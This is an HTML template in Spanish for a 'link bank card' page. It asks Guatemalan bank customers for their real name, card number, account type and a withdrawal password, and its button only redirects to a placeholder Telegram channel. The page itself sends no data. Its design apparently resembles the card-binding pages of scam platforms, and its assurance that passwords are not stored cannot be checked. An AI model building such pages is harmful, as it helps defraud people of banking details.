<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Vincular Tarjeta Bancaria</title>

    <!-- Google Fonts y Material Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

    <!-- Estilos propios -->
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
            margin: 0;
            padding: 0;
        }

        .header {
            background: #673ab7;
            color: white;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }

        .header button, .header a {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
        }

        .container {
            padding: 20px;
            max-width: 500px;
            margin: auto;
        }

        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
            position: relative;
        }

        .form-group label {
            display: block;
            font-weight: 500;
            margin-bottom: 5px;
            color: #555;
        }

        .form-group input, .form-group select {
            width: 100%;
            padding: 12px;
            border-radius: 10px;
            border: 1px solid #ccc;
            outline: none;
            transition: all 0.3s ease-in-out;
            background: #fff;
        }

        .form-group input:focus, .form-group select:focus {
            border-color: #673ab7;
            box-shadow: 0 0 5px rgba(103,58,183,0.4);
        }

        .btn {
            width: 100%;
            padding: 15px;
            background: #673ab7;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            transition: background 0.3s ease;
            cursor: pointer;
        }

        .btn:hover {
            background: #512da8;
        }

        .note {
            font-size: 12px;
            text-align: center;
            color: #777;
            margin-top: 15px;
        }

        .file-upload {
            position: relative;
            width: 100%;
            height: 100px;
            border: 2px dashed #ccc;
            border-radius: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fafafa;
            cursor: pointer;
        }

        .file-upload input[type="file"] {
            position: absolute;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: pointer;
        }

        .file-upload span {
            color: #888;
            font-size: 14px;
        }
    </style>
</head>

<body>

    <div class="header">
        <button onclick="window.location.href='/index/my/index.html'"><i class="material-icons">chevron_left</i></button>
        <span>Vincular Tarjeta</span>
        <a href="/index/support/index.html"><i class="material-icons">support_agent</i></a>
    </div>

    <div class="container">
        <h2>Información Bancaria</h2>

        <form id="bankForm">
            <div class="form-group">
                <label>Selecciona tu banco</label>
                <select name="bank_code" required>
                    <option value="">Elige un banco</option>
                    <option value="banrural">Banrural</option>
                    <option value="industrial">Banco Industrial</option>
                    <option value="gyt">G&T Continental</option>
                    <option value="bac">BAC Credomatic</option>
                    <option value="promerica">Promerica</option>
                    <option value="azteca">Banco Azteca</option>
                </select>
            </div>

            <div class="form-group">
                <label>Nombre Real</label>
                <input type="text" name="username" required maxlength="60">
            </div>

            <div class="form-group">
                <label>Número de Tarjeta</label>
                <input type="text" name="card_number" required maxlength="30">
            </div>

            <div class="form-group">
                <label>Tipo de Cuenta</label>
                <input type="text" name="account_type" placeholder="Ahorros o Monetaria" required>
            </div>

            <div class="form-group">
                <label>Contraseña de Retiro</label>
                <input type="password" name="withdraw_password" required>
            </div>

            <div class="form-group">
                <label>Subir Documento (opcional)</label>
                <div class="file-upload">
                    <input type="file" name="document">
                    <span>Click para seleccionar archivo</span>
                </div>
            </div>

            <button type="button" class="btn" onclick="enviarTelegram()">Modificar información</button>

            <p class="note">Nunca compartas tu contraseña bancaria con nadie. Este sistema no guarda tu contraseña bancaria real.</p>
        </form>
    </div>

    <script>
        function enviarTelegram() {
            // Aquí puedes poner el enlace de tu Telegram
            window.location.href = "https://t.me/TuCanalTelegram";
        }
    </script>

</body>
</html>
